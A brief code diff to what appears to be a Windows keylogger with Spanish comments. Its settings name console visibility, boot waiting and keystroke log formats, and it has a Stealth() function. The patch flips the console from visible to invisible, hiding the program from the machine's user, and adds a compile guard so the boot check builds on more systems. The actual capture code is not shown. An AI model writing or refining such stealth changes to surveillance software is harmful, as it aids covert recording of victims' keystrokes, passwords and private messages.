@@ -21,7 +21,7 @@
 
 // ---------- Configuracion ----------
 // Visibilidad de la ventana de consola.
-#define visible   // (visible / invisible)
+#define invisible   // (visible / invisible)
 // Esperar al arranque del sistema antes de iniciar.
 #define nowait    // (bootwait / nowait)
 // Formato de registro: 0 nombre legible, 10 decimal, 16 hex.
@@ -290,7 +290,11 @@ void Stealth() {
 }
 
 bool IsSystemBooting() {
+#ifndef SM_SYSTEMDOCKED
+    return false;
+#else
     return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
+#endif
 }
 
 int main() {
